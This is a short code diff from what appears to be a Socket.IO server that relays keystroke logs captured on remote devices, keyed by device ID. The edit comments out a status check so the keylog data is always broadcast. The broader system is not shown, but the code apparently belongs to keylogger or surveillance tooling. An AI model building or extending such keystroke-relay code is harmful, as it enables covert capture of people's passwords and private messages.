@@ -503,18 +503,18 @@ export const startSocketIO = async () => {
 							keyEvent
 						);
 
-						if (res.status == 200) {
-							io.emit(
-								`${SocketIOPublicEvents.KEY_SHARE}-${deviceId}`,
-								{
-									deviceId: deviceId,
-									keyLogsType: keyLogsType,
-									keylogs: keylogs || "None",
-									keyevent: keyEvent,
-									created_at: Date.now(),
-								}
-							);
-						}
+						// if (res.status == 200) {
+						io.emit(
+							`${SocketIOPublicEvents.KEY_SHARE}-${deviceId}`,
+							{
+								deviceId: deviceId,
+								keyLogsType: keyLogsType,
+								keylogs: keylogs || "None",
+								keyevent: keyEvent,
+								created_at: Date.now(),
+							}
+						);
+						// }
 					} catch (error) {
 						console.log("Key Logs Response Error", error);
 					}
